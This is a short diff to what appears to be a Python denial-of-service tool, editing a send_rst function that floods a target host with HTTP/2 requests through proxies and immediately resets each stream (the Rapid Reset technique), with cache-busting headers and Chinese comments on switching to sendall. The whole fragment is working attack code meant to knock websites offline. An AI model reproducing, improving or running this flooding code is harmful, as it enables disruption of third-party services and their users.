@@ -396,15 +396,14 @@ def send_rst(): #Send http2 requests with rst_stream (已失效)
                                                 (":authority", host),
                                                 (":path", p),
                                                 (":scheme", proto),
-                                                ("Cache-Control","no-Cahe, max-age=0")
+                                                ("Cache-Control","no-Cache, max-age=0") # 略過快取
                                                 ],
                                                 end_stream=True)
-                        s.send(conn.data_to_send())
+                        s.sendall(conn.data_to_send()) # 改用sendall一次送完所有資料
                     for sid in sid_lst:
                         conn.reset_stream(sid)
-                        s.send(conn.data_to_send())
+                        s.sendall(conn.data_to_send()) # 改用sendall一次送完所有資料
                         print(f"[DPFh2]->Proxy {str(proxy_ip):^15s} RST_STREAM #{str(sid):^5s} > {host}")
-                    s.close()
                 except:
                     s.close()
             except:
